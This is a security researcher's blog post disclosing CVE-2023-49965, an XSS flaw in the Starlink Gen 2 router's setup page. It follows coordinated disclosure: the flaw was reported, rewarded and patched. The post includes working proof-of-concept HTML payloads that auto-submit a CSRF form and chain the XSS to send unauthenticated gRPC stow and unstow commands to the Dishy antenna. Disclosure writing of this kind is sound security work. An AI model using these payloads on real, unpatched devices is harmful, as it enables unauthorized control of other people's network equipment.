<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2023-49965 | SPACEX / STARLINK (ENG) | hackintoanetwork</title>
<meta name="keywords" content="SpaceX, Starlink, Router, Dishy, Exploit, Hacking, CVE-2023-49965">
<meta name="description" content="Found by Sehyoung Lee @hackintoanetwork">
<meta name="author" content="">
<link rel="canonical" href="https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.a4e69204638e6704374d8280b361c637c9345cbe356eeb3414645f753ed82835.css" integrity="sha256-pOaSBGOOZwQ3TYKAs2HGN8k0XL41bus0FGRfdT7YKDU=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://hackintoanetwork.com/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://hackintoanetwork.com/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://hackintoanetwork.com/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://hackintoanetwork.com/apple-touch-icon.png">
<link rel="mask-icon" href="https://hackintoanetwork.com/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CVE-2023-49965 | SPACEX / STARLINK (ENG)" />
<meta property="og:description" content="Found by Sehyoung Lee @hackintoanetwork" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/" /><meta property="article:section" content="blog" />



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2023-49965 | SPACEX / STARLINK (ENG)"/>
<meta name="twitter:description" content="Found by Sehyoung Lee @hackintoanetwork"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://hackintoanetwork.com/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CVE-2023-49965 | SPACEX / STARLINK (ENG)",
      "item": "https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2023-49965 | SPACEX / STARLINK (ENG)",
  "name": "CVE-2023-49965 | SPACEX \/ STARLINK (ENG)",
  "description": "Found by Sehyoung Lee @hackintoanetwork",
  "keywords": [
    "SpaceX", "Starlink", "Router", "Dishy", "Exploit", "Hacking", "CVE-2023-49965"
  ],
  "articleBody": "TL;DR A Cross-Site Scripting (XSS) vulnerability in the initial captive portal page of the second-generation router could allow an attacker to take control of the router and Dishy.\nThe Basics Product : Starlink Router Gen 2 Tested Version : 2022.32.0 (The fix is in versions 2023.48.0 and up) Bug-class : XSS (Cross-Site Scripting) Overview of the Vulnerability The vulnerability is caused by insufficient filtering of input values for the ssid and password parameters on the initial captive portal page (http://192.168.1.1/setup).\nProof of Concept This Cross-Site Scripting (XSS) vulnerability can be leveraged in conjunction with a Cross-Site Request Forgery (CSRF) attack, as shown in the proof of concept above.\nProof-of-Concept.mov\nExploit Normally, the captive portal page should only be active on the router's internal address, 192.168.1.1, but there was a bug in older routers that allowed the captive portal page to be unexpectedly accessible from Dishy's internal address, 192.168.100.1.\nhttp://192.168.1.1/setup → The captive portal page is displayed correctly.\nhttp://192.168.100.1/setup → The captive portal page is also displayed at this address.\n(Normally, access to the captive portal page should not be possible at Dishy's internal address, 192.168.100.1.)\nUsing such a bug along with the Cross-Site Scripting (XSS) vulnerability allows for the circumvention of the browser’s Same-Origin Policy (SOP), enabling control over both the Router and Dishy.\n192.168.100.1_Proof-of-Concept.mov\nIt can be confirmed that the same Cross-Site Scripting (XSS) vulnerability occurs at the address http://192.168.100.1/setup as well.\nNow let’s see how i can leverage these bugs to take control of Router and Dishy.\nDishy Stow Request Analysis When the Stow command is issued from the administrator interface, the following HTTP Request is sent to Dishy\n(Note: The Stow command allows the Dishy antenna to be folded for movement or storage.)\nPOST /SpaceX.API.Device.Device/Handle HTTP/1.1 Host: 192.168.100.1:9201 Content-Length: 8 x-grpc-web: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36 content-type: application/grpc-web+proto Accept: */* Origin: http://dishy.starlink.com Referer: http://dishy.starlink.com/ Accept-Encoding: gzip, deflate, br Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close �} This Request’s header contains several important pieces of information.\nx-grpc-web: 1\nThis indicates the use of the gRPC-Web protocol.\n(gRPC-Web is a protocol that allows web clients to make gRPC calls to a server.)\ncontent-type: application/grpc-web+proto\nIt signifies that the data being transmitted uses the gRPC protocol and is encoded in the protobuf format.\nRequest Body\nDishy Stow Request body (protobuf encoded)\n\\x00\\x00\\x00\\x00\\x03\\x92\\x7d\\x00 The request body contains data in the grpc-web+proto format, which likely holds the details of the Stow command.\nBased on the given byte sequence 00 00 00 00 03 92 7d 00 and its decoding results, we can confirm that the field number 2002 in the user_terminal_frontend’s device.proto file matches the stow functionality. This helps us understand more specifically what the byte sequence actually signifies.\nPutting this information together, when a user issues a Stow command using the admin interface, the command is sent to Dishy over gRPC, which folds Dishy into a portable state.\nHowever, if you look at the request, you’ll notice that there is no authentication for the user sending it.\nThis means that someone other than an administrator could send the same request and take control of Dishy without authorization. But this vulnerability requires the attacker to have physical access to the local network, which limits the scope of the attack compared to attacks that can occur remotely.\nPossibility and Limitations of CSRF Attacks If so, you might be thinking that you can attempt a Cross-Site Request Forgery (CSRF) attack with a payload that sends the same request.\nWhile this is a possible scenario, the browser’s Same-Origin Policy (SOP) limits this attack.\ngRPC requires a specific content-type header called application/grpc-web+proto.\nHowever, the Same-Origin Policy (SOP) causes browsers to strip this header when sending requests from other sources.\nThis makes it impossible to send gRPC requests to Dishy from the outside under normal circumstances.\nXSS: An Effective Way to Bypass SOP Normally, a Same-Origin Policy (SOP) restricts web browsers from making requests from different sources.\nHowever, with a Cross-Site Scripting (XSS) vulnerability, an attacker can execute a script within the victim’s web browser.\nScripts injected by an attacker using a Cross-Site Scripting (XSS) vulnerability are considered to have been executed from the same source (i.e., the website the victim is currently on).\nBecause of this, the Same-Origin Policy (SOP) recognizes requests generated by these scripts as coming from the same source, and therefore the restrictions of the Same-Origin Policy (SOP) do not apply in this case.\nTherefore, in a Cross-Site Request Forgery (CSRF) attack using a Cross-Site Scripting (XSS) vulnerability that requires a specific content-type header, such as a gRPC request, because the attack script is running inside the victim’s browser, the request is recognized as a legitimate request and sent with this specific content-type header.\nFor example, by chaining a bug in 192.168.100.1 and Cross-Site Scripting (XSS) vulnerability, an attacker could send a malicious script to proxy a user’s browser to send a gRPC request to command the Router or Dishy. (The attacker could send a variety of gRPC requests, including Dishy’s Stow and Unstow commands).\nExploit PoC (Proof of Concept) Therefore, by chaining the Cross-Site Scripting (XSS) vulnerability and the aforementioned bug, a payload that sends a Stow gRPC request to Dishy can be constructed as follows: (The result is that an attacker can remotely take control of the router or Dishy. For example, they could send gRPC commands to change router settings or manipulate Dishy's functionality.)\nDishy Stow and Unstow Demo Exploit-Demo.mp4\nCVE CVE-2023-49965 TimeLine 2023-10-10 : Vulnerability reported to SpaceX/Starlink 2023-10-12 : Recognized as a security vulnerability with a severity of Moderate ( Reward $500 USD ) 2023-11-01 : Patched in the latest release (The fix is in versions 2023.48.0 and up) ",
  "wordCount" : "1015",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-eng/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "hackintoanetwork",
    "logo": {
      "@type": "ImageObject",
      "url": "https://hackintoanetwork.com/favicon.ico"
    }
  }
}
</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-P2FSMQE5SL"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-P2FSMQE5SL');
</script>

<header class="header sticky-header">
    <nav class="nav">
        <div class="logo">
            <a href="https://hackintoanetwork.com/" accesskey="h" title="hackintoanetwork (Alt + H)">hackintoanetwork</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://hackintoanetwork.com/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://hackintoanetwork.com/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://hackintoanetwork.com/">Home</a>&nbsp;»&nbsp;<a href="https://hackintoanetwork.com/blog/">Blogs</a></div>
    <h1 class="post-title">
      CVE-2023-49965 | SPACEX / STARLINK (ENG)
    </h1>
    <div class="post-description">
      Found by Sehyoung Lee @hackintoanetwork
    </div>
    <div class="post-meta">


Dec 2023

</div>
  </header> 
  <div class="post-content"><h1 id="tldr">TL;DR<a hidden class="anchor" aria-hidden="true" href="#tldr">#</a></h1>
<hr>
<p>A <code>Cross-Site Scripting (XSS)</code> vulnerability in the initial <code>captive portal</code> page of the second-generation router could allow an attacker to take control of the <code>router</code> and <code>Dishy</code>.</p>
<h1 id="the-basics"><strong>The Basics</strong><a hidden class="anchor" aria-hidden="true" href="#the-basics">#</a></h1>
<hr>
<ul>
<li><strong>Product :</strong> Starlink Router Gen 2</li>
<li><strong>Tested Version :</strong> 2022.32.0 (The fix is in versions 2023.48.0 and up)</li>
<li><strong>Bug-class</strong> : XSS (Cross-Site Scripting)</li>
</ul>
<h1 id="overview-of-the-vulnerability"><strong><strong>Overview of the Vulnerability</strong></strong><a hidden class="anchor" aria-hidden="true" href="#overview-of-the-vulnerability">#</a></h1>
<hr>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img1.png" alt="img1.png"  />
</p>
<p>The vulnerability is caused by insufficient filtering of input values for the <code>ssid</code> and <code>password</code> parameters on the initial <code>captive portal</code> page (<a href="http://192.168.1.1/setup">http://192.168.1.1/setup</a>).</p>
<pre tabindex="0"><code>&lt;html&gt;
	&lt;body&gt;
		&lt;h1&gt;Proof of Concept&lt;/h1&gt;
		&lt;form id=&#34;PoC&#34; method=&#34;POST&#34; action=&#34;http://192.168.1.1/setup&#34;&gt;
			&lt;input type=&#34;hidden&#34; name=&#34;ssid&#34; value=&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;&gt;
			&lt;!-- &lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;&gt; --&gt;
		&lt;/form&gt;
		&lt;script type=&#34;text/javascript&#34;&gt;
			document.addEventListener(&#34;DOMContentLoaded&#34;, function() {
				document.getElementById(&#34;PoC&#34;).submit();
			});
		&lt;/script&gt;
	&lt;/body&gt;
&lt;html&gt;
</code></pre><p>This <code>Cross-Site Scripting (XSS)</code> vulnerability can be leveraged in conjunction with a <code>Cross-Site Request Forgery (CSRF)</code> attack, as shown in the <code>proof of concept</code> above.</p>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/reproduce(PoC).mov">Proof-of-Concept.mov</a></p>
<h1 id="exploit"><strong>Exploit</strong><a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h1>
<hr>
<p>Normally, the <code>captive portal</code> page should only be active on the <code>router's internal address</code>, 192.168.1.1, but there was a bug in older routers that allowed the <code>captive portal</code> page to be unexpectedly accessible from <code>Dishy's internal address</code>, 192.168.100.1.</p>
<ul>
<li>
<p><a href="http://192.168.1.1/setup">http://192.168.1.1/setup</a> → The <code>captive portal</code> page is displayed correctly.</p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img2.png" alt="http://192.168.1.1/setup"  />
</p>
</li>
<li>
<p><a href="http://192.168.100.1/setup">http://192.168.100.1/setup</a> → The <code>captive portal</code> page is also displayed at this address.</p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img3.png" alt="http://192.168.100.1/setup"  />
</p>
</li>
</ul>
<p>(Normally, access to the <code>captive portal</code> page should not be possible at <code>Dishy's internal address</code>, 192.168.100.1.)</p>
<p>Using such a bug along with the <code>Cross-Site Scripting (XSS)</code> vulnerability allows for the circumvention of the browser&rsquo;s <code>Same-Origin Policy (SOP)</code>, enabling control over both the Router and Dishy.</p>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/192.168.100.1_PoC.mov">192.168.100.1_Proof-of-Concept.mov</a></p>
<p>It can be confirmed that the same <code>Cross-Site Scripting (XSS)</code> vulnerability occurs at the address <a href="http://192.168.100.1/setup">http://192.168.100.1/setup</a> as well.</p>
<p>Now let&rsquo;s see how i can leverage these bugs to take control of <code>Router</code> and <code>Dishy</code>.</p>
<h2 id="dishy-stow-request-analysis">Dishy Stow Request Analysis<a hidden class="anchor" aria-hidden="true" href="#dishy-stow-request-analysis">#</a></h2>
<hr>
<center>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/gif1.gif" alt="Starlink Dishy Stow"  />
</p>
</center>
<p>When the <code>Stow</code> command is issued from the administrator interface, the following HTTP Request is sent to <code>Dishy</code></p>
<p>(Note: The <code>Stow</code> command allows the <code>Dishy</code> antenna to be folded for movement or storage.)</p>
<pre tabindex="0"><code>POST /SpaceX.API.Device.Device/Handle HTTP/1.1
Host: 192.168.100.1:9201
Content-Length: 8
x-grpc-web: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
content-type: application/grpc-web+proto
Accept: */*
Origin: http://dishy.starlink.com
Referer: http://dishy.starlink.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

�}
</code></pre><p>This Request&rsquo;s header contains several important pieces of information.</p>
<ul>
<li>
<p><strong>x-grpc-web: 1</strong></p>
<p>This indicates the use of the <strong><code>gRPC-Web</code></strong> protocol.</p>
<p>(<strong><code>gRPC-Web</code></strong> is a protocol that allows web clients to make gRPC calls to a server.)</p>
</li>
<li>
<p><strong>content-type: application/grpc-web+proto</strong></p>
<p>It signifies that the data being transmitted uses the gRPC protocol and is encoded in the protobuf format.</p>
</li>
</ul>
<p><strong>Request Body</strong></p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/img4.png" alt="Dishy Stow Request body (protobuf encoded)"  />
</p>
<p>Dishy Stow Request body (protobuf encoded)</p>
<pre tabindex="0"><code>\x00\x00\x00\x00\x03\x92\x7d\x00
</code></pre><p>The request body contains data in the <strong><code>grpc-web+proto</code></strong> format, which likely holds the details of the <strong><code>Stow</code></strong> command.</p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/grpc-proto.png" alt="Dishy Stow Request body (protobuf decoded)"  />
</p>
<p>Based on the given byte sequence <code>00 00 00 00 03 92 7d 00</code> and its decoding results, we can confirm that the field number <code>2002</code> in the <code>user_terminal_frontend</code>&rsquo;s <code>device.proto</code> file matches the <code>stow</code> functionality. This helps us understand more specifically what the byte sequence actually signifies.</p>
<p><img loading="lazy" src="/blog/2023-Starlink-Router-Gen2-XSS/device-proto.png" alt="device.proto"  />
</p>
<p>Putting this information together, when a user issues a <code>Stow</code> command using the admin interface, the command is sent to <code>Dishy</code> over <code>gRPC</code>, which folds <code>Dishy</code> into a portable state.</p>
<p>However, if you look at the request, you&rsquo;ll notice that there is no authentication for the user sending it.</p>
<p>This means that someone other than an administrator could send the same request and take control of <code>Dishy</code> without authorization. But this vulnerability requires the attacker to have <code>physical access</code> to the <code>local network</code>, which limits the scope of the attack compared to attacks that can occur remotely.</p>
<h2 id="possibility-and-limitations-of-csrf-attacks"><strong>Possibility and Limitations of CSRF Attacks</strong><a hidden class="anchor" aria-hidden="true" href="#possibility-and-limitations-of-csrf-attacks">#</a></h2>
<hr>
<p>If so, you might be thinking that you can attempt a <code>Cross-Site Request Forgery (CSRF)</code> attack with a payload that sends the same request.</p>
<p>While this is a possible scenario, the browser&rsquo;s <code>Same-Origin Policy (SOP)</code> limits this attack.</p>
<p><code>gRPC</code> requires a specific <code>content-type</code> header called <code>application/grpc-web+proto</code>.</p>
<p>However, the <code>Same-Origin Policy (SOP)</code> causes browsers to strip this header when sending requests from other sources.</p>
<p>This makes it impossible to send <code>gRPC</code> requests to <code>Dishy</code> from the outside under normal circumstances.</p>
<h2 id="xss-an-effective-way-to-bypass-sop">XSS: An Effective Way to Bypass SOP<a hidden class="anchor" aria-hidden="true" href="#xss-an-effective-way-to-bypass-sop">#</a></h2>
<hr>
<p>Normally, a <code>Same-Origin Policy (SOP)</code> restricts web browsers from making requests from different sources.</p>
<p>However, with a <code>Cross-Site Scripting (XSS)</code> vulnerability, an attacker can execute a script within the victim&rsquo;s web browser.</p>
<p>Scripts injected by an attacker using a <code>Cross-Site Scripting (XSS)</code> vulnerability are considered to have been executed from the same source (i.e., the website the victim is currently on).</p>
<p>Because of this, the <code>Same-Origin Policy (SOP)</code> recognizes requests generated by these scripts as coming from the same source, and therefore the restrictions of the <code>Same-Origin Policy (SOP)</code> do not apply in this case.</p>
<p>Therefore, in a <code>Cross-Site Request Forgery (CSRF)</code> attack using a <code>Cross-Site Scripting (XSS)</code> vulnerability that requires a specific <code>content-type</code> header, such as a <code>gRPC</code> request, because the attack script is running inside the victim&rsquo;s browser, the request is recognized as a legitimate request and sent with this specific <code>content-type</code> header.</p>
<p>For example, by chaining a bug in <code>192.168.100.1</code> and <code>Cross-Site Scripting (XSS)</code> vulnerability, an attacker could send a malicious script to proxy a user&rsquo;s browser to send a <code>gRPC</code> request to command the <code>Router</code> or <code>Dishy</code>. (The attacker could send a variety of <code>gRPC</code> requests, including Dishy&rsquo;s <code>Stow</code> and <code>Unstow</code> commands).</p>
<h2 id="exploit-poc-proof-of-concept">Exploit PoC (Proof of Concept)<a hidden class="anchor" aria-hidden="true" href="#exploit-poc-proof-of-concept">#</a></h2>
<hr>
<p>Therefore, by chaining the <code>Cross-Site Scripting (XSS)</code> vulnerability and the aforementioned <code>bug</code>, a payload that sends a <code>Stow gRPC</code> request to <code>Dishy</code> can be constructed as follows: (The result is that an attacker can remotely take control of the <code>router</code> or <code>Dishy</code>. For example, they could send <code>gRPC</code> commands to change <code>router settings</code> or manipulate <code>Dishy's functionality</code>.)</p>
<pre tabindex="0"><code>&lt;html&gt;
	&lt;body&gt;
		&lt;h1&gt;Dishy Stow and Unstow&lt;/h1&gt;
		&lt;form id=&#34;PoC&#34; method=&#34;POST&#34; action=&#34;http://192.168.100.1/setup&#34;&gt;
			&lt;!-- &lt;input type=&#34;hidden&#34; name=&#34;ssid&#34; value=&#39;&#34; onfocus=javascript:alert(`XSS`); autofocus=&#34;&#39;&gt; --&gt;
			&lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#39;&#34;&gt;&lt;script&gt;for(let i=0;i&lt;100;i++){setTimeout(()=&gt;{var xhr=new XMLHttpRequest();xhr.open(&#34;POST&#34;,&#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle&#34;,true);xhr.setRequestHeader(&#34;x-grpc-web&#34;,&#34;1&#34;);xhr.setRequestHeader(&#34;Content-Type&#34;,&#34;application/grpc-web+proto&#34;);xhr.onreadystatechange=()=&gt;{if(xhr.readyState==4&amp;&amp;xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=&gt;{var xhr2=new XMLHttpRequest();xhr2.open(&#34;POST&#34;,&#34;http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle&#34;,true);xhr2.setRequestHeader(&#34;x-grpc-web&#34;,&#34;1&#34;);xhr2.setRequestHeader(&#34;Content-Type&#34;,&#34;application/grpc-web+proto&#34;);xhr2.onreadystatechange=()=&gt;{if(xhr2.readyState==4&amp;&amp;xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}&lt;/script&gt;&lt;input type=&#34;hidden&#39;/&gt;
		&lt;/form&gt;
		&lt;script type=&#34;text/javascript&#34;&gt;
			document.addEventListener(&#34;DOMContentLoaded&#34;, function() {
				document.getElementById(&#34;PoC&#34;).submit();
			});
		&lt;/script&gt;
	&lt;/body&gt;
&lt;html&gt;
</code></pre><h1 id="demo">Demo<a hidden class="anchor" aria-hidden="true" href="#demo">#</a></h1>
<hr>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/Exploit-PoC.mp4">Exploit-Demo.mp4</a></p>
<h1 id="cve">CVE<a hidden class="anchor" aria-hidden="true" href="#cve">#</a></h1>
<ul>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-49965">CVE-2023-49965</a></li>
</ul>
<h1 id="timeline"><strong>TimeLine</strong><a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h1>
<ul>
<li>2023-10-10 : Vulnerability reported to SpaceX/Starlink</li>
<li>2023-10-12 : Recognized as a security vulnerability with a severity of Moderate ( Reward <code>$500</code> USD )</li>
<li>2023-11-01 : Patched in the latest release (The fix is in versions <code>2023.48.0</code> and up)</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://hackintoanetwork.com/tags/spacex/">SpaceX</a></li>
      <li><a href="https://hackintoanetwork.com/tags/starlink/">Starlink</a></li>
      <li><a href="https://hackintoanetwork.com/tags/router/">Router</a></li>
      <li><a href="https://hackintoanetwork.com/tags/dishy/">Dishy</a></li>
      <li><a href="https://hackintoanetwork.com/tags/exploit/">Exploit</a></li>
      <li><a href="https://hackintoanetwork.com/tags/hacking/">Hacking</a></li>
      <li><a href="https://hackintoanetwork.com/tags/cve-2023-49965/">CVE-2023-49965</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2025 <a href="https://hackintoanetwork.com/">hackintoanetwork</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
